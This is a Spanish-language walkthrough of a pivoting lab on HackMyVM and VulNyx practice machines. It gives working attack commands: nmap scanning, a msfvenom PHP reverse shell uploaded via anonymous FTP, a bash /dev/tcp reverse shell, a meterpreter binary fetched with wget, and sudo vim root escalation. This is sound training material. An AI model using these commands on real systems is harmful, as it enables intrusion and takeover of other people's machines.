Maquinas que vamos a utilizar **Kali Linux , Friendly y Basic.**

  

[https://hackmyvm.eu/machines/machine.php?vm=Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)

[VulNyx | Offensive Security Playground](https://vulnyx.com/#basic)

  

- Configuramos las redes en VirtualBox **Archivos → Herramientas → Administrador de red.**
    
    - Tenemos que tener creadas dos redes.
        
        1. Red **Pedro → 10.0.3.0/24**
            
            ![[Imagenes/image 1 51.png|image 1 51.png]]
            
        
          
        
        1. Red **Red_Pivoting → 10.10.10.0/24**
            
            ![[Imagenes/image 2 50.png|image 2 50.png]]
            
    
      
    
    - Los adaptadores de red de las maquinas quedarían asi.
        
        1. Maquina Kali quedaría así:
            
            ![[Imagenes/image 3 49.png|image 3 49.png]]
            
            En la Kali Linux me tendría que aparecer una IP dentro del rango de red que le había asignado. Lo veríamos con `ifconfig`.
            
            ![[Imagenes/image 63.png|image 63.png]]
            
        
          
        
        1. Maquina Friendly:
            
            ![[Imagenes/image 1 52.png|image 1 52.png]]
            
            ![[Imagenes/image 2 51.png|image 2 51.png]]
            
            ![[Imagenes/image 3 50.png|image 3 50.png]]
            
        
          
        
        1. La maquina Basic:
            
            ![[Imagenes/image 4 47.png|image 4 47.png]]
            
            ![[Imagenes/image 5 46.png|image 5 46.png]]
            

![[Imagenes/image 6 43.png|image 6 43.png]]

  

- Empezamos con la intrusión de la maquina Friendly.
    
    ```Bash
    sudo arp-scan -I eth0 --localnet
    ```
    
    ![[Imagenes/image 7 41.png|image 7 41.png]]
    

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.21
```

![[Imagenes/image 8 39.png|image 8 39.png]]

- Miramos el puerto 80 en el navegador web
    
    ![[Imagenes/image 9 36.png|image 9 36.png]]
    
    Vemos que esta corriendo una plantilla FTP
    
      
    
- Vemos también que tiene el puerto 21 abierto con el FTP con el **anonymous** habilitado. Lo probamos.
    
    ![[Imagenes/image 10 32.png|image 10 32.png]]
    
      
    
    ```Bash
    ftp 10.0.3.21 
    ```
    
    `ls`
    
    ![[Imagenes/image 11 26.png|image 11 26.png]]
    
    Listamos fichero y vemos un **index.html** que suele ser la pagina de inicio de una web. Salimos con `exit`.
    

  

- Vamos a crear un Payload con msfvenom.
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php  
    ```
    
    ![[Imagenes/image 12 26.png|image 12 26.png]]
    

  

- Volvemos a entrar en el FTP y hacemos un `put` del archivo que acabamos de crear.
    
    ```Bash
    ftp 10.0.3.21
    ```
    
    `put pwned.php`
    
    ![[Imagenes/image 13 24.png|image 13 24.png]]
    
    Salimos con `exit`.
    
      
    
- Nos ponemos a la escucha con netcat
    
    ```Bash
    nc -nlvp 443 
    ```
    
    ![[Imagenes/image 14 22.png|image 14 22.png]]
    

  

- En el navegador web escribimos [http://10.0.3.21/pwned.php](http://10.0.3.21/pwned.php) para ejecutar el payload.
    
    ![[Imagenes/image 15 19.png|image 15 19.png]]
    
    ![[Imagenes/image 16 16.png|image 16 16.png]]
    

  

- Como la conexión creada con msfvenom no es muy estable vamos a estabilizarla. Vamos a la web de [https://www.revshells.com/](https://www.revshells.com/) y ponemos los datos que necesitamos para crear un código para estabilizar.  
      
    
    ![[Imagenes/image 17 13.png|image 17 13.png]]
    

  

- Nos ponemos a la escucha por el puerto 444 con netcat.
    
    ```Bash
    nc -nlvp 444 
    ```
    
    ![[Imagenes/image 18 11.png|image 18 11.png]]
    

  

- En la conexión del puerto 443 escribimos lo siguiente:
    
    `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
    
    ![[Imagenes/image 19 8.png|image 19 8.png]]
    
    ![[Imagenes/image 20 8.png|image 20 8.png]]
    
    Cerramos el terminal de la conexión 443 que no la vamos a necesitar.
    
      
    
- Abrimos otro terminal , nos movemos al escritorio y nos creamos un payload con msfvemon.
    
    Lo que vamos ha hacer es crear un ejecutable que directamente nos de una sesión de meterpreter en Metasploit.
    
    ```Bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
    ```
    
    ![[Imagenes/image 21 7.png|image 21 7.png]]
    

  

- Creamos un servidor web con Python para compartir el archivo con la maquina victima.
    
    ```Bash
    python3 -m http.server 80
    ```
    
    ![[Imagenes/image 22 7.png|image 22 7.png]]
    
      
    
- Nos vamos al terminal donde habíamos conseguido entrar y nos subimos el archivo a la maquina victima.
    
    `wget 10.0.3.4/virus`
    
    ![[Imagenes/image 23 7.png|image 23 7.png]]
    

  

- Abrimos el Metasploit
    
    ![[Imagenes/image 24 6.png|image 24 6.png]]
    
      
    
    - Cargamos el **multi/handler**
        
        `use /multi/handler`
        
        ![[Imagenes/image 25 6.png|image 25 6.png]]
        

- Miramos las opciones y ponemos las que necesitemos. Tenemos que tener qen cuenta que **debemos cambiar también el payload por que no es el mismo que el de nuestro archivo virus.**
    
    `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
    
    `set LHOST 10.0.3.4`
    
    `show options`
    
    ![[Imagenes/image 26 4.png|image 26 4.png]]
    

  

- Lo ejecutamos para ponerlo a la escucha.
    
    `run`
    
    ![[Imagenes/image 27 4.png|image 27 4.png]]
    

  

- En el terminal de la maquina intermedia ejecutamos el archivo virus
    
    `ls`
    
    `chmod +x virus`
    
    `./virus`
    
    ![[Imagenes/image 28 4.png|image 28 4.png]]
    

- Ya tendríamos abierta la sesión de meterpreter en la maquina intermedia.
    
    > [!important] Hemos hecho todo esto para abrir la sesión de meterpreter por que para hacer Pivoting es necesario hacerlo desde un meterpreter.
    
    ![[Imagenes/image 29 4.png|image 29 4.png]]
    

> [!important] Pero tenemos un grabe problema si miramos quien soy con **whoami** veremos que **no soy root** y no podemos hacer **pivoting sin ser root**. Con esto vemos **la importancia de ser root.**

`shell`

`whoami`

![[Imagenes/image 30 4.png|image 30 4.png]]

  

- Hacemos exit.
    
    `exit`
    
    `exit`
    
    ![[Imagenes/image 31 3.png|image 31 3.png]]
    

- En el terminal de la maquina intermedia empezamos a escalar privilegios.
    
    `whoami`
    
    `sudo -l`
    
    ![[Imagenes/image 32 3.png|image 32 3.png]]
    
      
    
    - Hacemos un tratamiento mínimo de la TTY
        
        `script /dev/null -c bash`
        
        ![[Imagenes/image 33 3.png|image 33 3.png]]
        
          
        
- Nos vamos a la web [https://gtfobins.github.io/](https://gtfobins.github.io/) y **miramos Vim con Sudo.**
    
    ![[Imagenes/image 34 3.png|image 34 3.png]]
    
- Probamos el primer comando que nos muestra para ver si podemos conseguir una shell como root
    
    `sudo vim -c ':!/bin/sh'`
    
    `whoami`
    
    ![[Imagenes/image 35 3.png|image 35 3.png]]
    
      
    
- Volvemos a Metasploit y ejecutamos el **multi/handler** de nuevo**.**
    
    `run`
    
    ![[Imagenes/image 36 3.png|image 36 3.png]]
    

  

- Y en el Terminal de la maquina intermedia volvemos a lanzar el archivo virus.
    
    `./virus`
    
    ![[Imagenes/image 37 2.png|image 37 2.png]]
    
      
    
    En el Metasploit
    
    ![[Imagenes/image 38 2.png|image 38 2.png]]
    

  

> [!important] Debemos recordar que para hacer pivoting necesitamos un meterpreter no una shell. por tanto debemos alternar entre ellos con el comando `shell` para tener una shell y con el comando `exit` para salir del la shell al meterpreter.